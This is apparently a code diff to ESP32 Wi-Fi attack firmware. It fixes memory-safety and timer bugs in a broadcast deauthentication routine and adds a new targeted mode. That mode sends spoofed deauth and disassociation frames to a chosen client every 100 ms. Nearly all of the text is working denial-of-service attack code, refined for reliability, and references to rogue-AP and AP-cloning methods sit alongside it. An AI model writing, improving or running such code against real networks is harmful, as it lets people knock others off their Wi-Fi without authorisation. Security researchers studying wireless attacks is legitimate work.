@@ -47,20 +47,38 @@ static void timer_send_deauth_frame(void *arg) {
 static esp_timer_handle_t deauth_timer_handles[MAX_ATTACK_TARGETS];
 static uint8_t active_timers = 0;
 
+/* Timer callbacks must not hold a pointer into the scanner's live record array:
+ * a background rescan reallocates it and the timer then reads freed memory. */
+static wifi_ap_record_t broadcast_ap_copy[MAX_ATTACK_TARGETS];
+
 void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
+    (void)period_sec;
     esp_wifi_set_ps(WIFI_PS_NONE);
     if (active_timers >= MAX_ATTACK_TARGETS) {
         ESP_LOGW(TAG, "Max targets reached, skipping AP: %s", ap_record->ssid);
         return;
     }
 
+    uint8_t slot = active_timers;
+    memcpy(&broadcast_ap_copy[slot], ap_record, sizeof(wifi_ap_record_t));
+
     const esp_timer_create_args_t deauth_timer_args = {
         .callback = &timer_send_deauth_frame,
-        .arg = (void *) ap_record
+        .arg = (void *) &broadcast_ap_copy[slot]
     };
 
-    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handles[active_timers]));
-    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handles[active_timers], 100000));
+    esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handles[slot]);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Timer create failed: %s", esp_err_to_name(err));
+        return;
+    }
+
+    err = esp_timer_start_periodic(deauth_timer_handles[slot], 100000);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Timer start failed: %s", esp_err_to_name(err));
+        esp_timer_delete(deauth_timer_handles[slot]);
+        return;
+    }
 
     active_timers++;
     ESP_LOGD(TAG, "Timer started for BSSID: %02x:%02x...", ap_record->bssid[0], ap_record->bssid[1]);
@@ -68,11 +86,31 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
 
 void attack_method_broadcast_stop() {
     for (int i = 0; i < active_timers; i++) {
-        ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handles[i]));
+        /* Not every timer is guaranteed to be running — a target that dropped
+         * out mid-attack leaves a stopped handle. ESP_ERROR_CHECK here used to
+         * abort the whole firmware in that case. */
+        if (esp_timer_is_active(deauth_timer_handles[i])) {
+            esp_timer_stop(deauth_timer_handles[i]);
+        }
         esp_timer_delete(deauth_timer_handles[i]);
+        deauth_timer_handles[i] = NULL;
     }
     active_timers = 0;
     ESP_LOGI(TAG, "All deauth timers stopped.");
+}
+
+/**
+ * @brief Stops every deauth flavour at once, regardless of which one started.
+ *
+ * attack_dos_stop() dispatches on the stored method, so a method change between
+ * start and stop leaves timers running. Modules that don't track the method
+ * (hunt, handshake) use this instead.
+ */
+void attack_method_deauth_all_stop() {
+    attack_method_broadcast_stop();
+    attack_method_targeted_stop();
+    attack_method_super_clone_stop();
+    ESP_LOGI(TAG, "All deauth methods stopped.");
 }
 
 void attack_method_rogueap(const wifi_ap_record_t *ap_record){
@@ -151,4 +189,90 @@ void attack_method_super_clone(const wifi_ap_record_t *ap_record) {
 
 void attack_method_super_clone_stop(void) {
     sc_running = false;
+}
+
+
+/* ── Targeted (single-client) deauth ─────────────────────────────────────── */
+
+static const char *TAG_TG = "main:targeted";
+static uint8_t  target_client_mac[6];
+static bool     target_client_set = false;
+static wifi_ap_record_t targeted_ap;     /* own copy: ap_record may be transient */
+static esp_timer_handle_t targeted_timer = NULL;
+
+void attack_method_set_target_client(const uint8_t mac[6]) {
+    memcpy(target_client_mac, mac, 6);
+    target_client_set = true;
+    ESP_LOGI(TAG_TG, "Target client set: %02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+}
+
+bool attack_method_get_target_client(uint8_t out_mac[6]) {
+    if (!target_client_set) return false;
+    memcpy(out_mac, target_client_mac, 6);
+    return true;
+}
+
+void attack_method_clear_target_client(void) {
+    target_client_set = false;
+}
+
+static void timer_send_targeted_deauth(void *arg) {
+    esp_err_t ch_err = esp_wifi_set_channel(targeted_ap.primary, WIFI_SECOND_CHAN_NONE);
+    if (ch_err != ESP_OK) {
+        ESP_LOGV(TAG_TG, "Channel set skip: %s", esp_err_to_name(ch_err));
+        return;
+    }
+    /* Spoof both directions: AP->client (deauth) and client->AP (disassoc). */
+    wsl_bypasser_send_deauth_targeted(targeted_ap.bssid, target_client_mac);
+    wsl_bypasser_send_disassociation_frame(targeted_ap.bssid, target_client_mac);
+}
+
+void attack_method_targeted(const wifi_ap_record_t *ap_record) {
+    if (ap_record == NULL) {
+        ESP_LOGE(TAG_TG, "No AP record");
+        return;
+    }
+    if (!target_client_set) {
+        ESP_LOGE(TAG_TG, "No target client selected; scan & select one first");
+        return;
+    }
+    if (targeted_timer != NULL) {
+        ESP_LOGW(TAG_TG, "Targeted deauth already running");
+        return;
+    }
+
+    memcpy(&targeted_ap, ap_record, sizeof(wifi_ap_record_t));
+    esp_wifi_set_ps(WIFI_PS_NONE);
+
+    const esp_timer_create_args_t targeted_timer_args = {
+        .callback = &timer_send_targeted_deauth,
+        .arg      = NULL,
+        .name     = "targeted_deauth"
+    };
+    esp_err_t err = esp_timer_create(&targeted_timer_args, &targeted_timer);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG_TG, "Timer create failed: %s", esp_err_to_name(err));
+        targeted_timer = NULL;
+        return;
+    }
+    err = esp_timer_start_periodic(targeted_timer, 100000); /* every 100 ms */
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG_TG, "Timer start failed: %s", esp_err_to_name(err));
+        esp_timer_delete(targeted_timer);
+        targeted_timer = NULL;
+        return;
+    }
+
+    ESP_LOGI(TAG_TG, "Targeted deauth started on ch %d", targeted_ap.primary);
+    oled_log(OLED_LINE1, 2, "Target deauth");
+}
+
+void attack_method_targeted_stop(void) {
+    if (targeted_timer != NULL) {
+        if (esp_timer_is_active(targeted_timer)) esp_timer_stop(targeted_timer);
+        esp_timer_delete(targeted_timer);
+        targeted_timer = NULL;
+        ESP_LOGI(TAG_TG, "Targeted deauth stopped");
+    }
 }
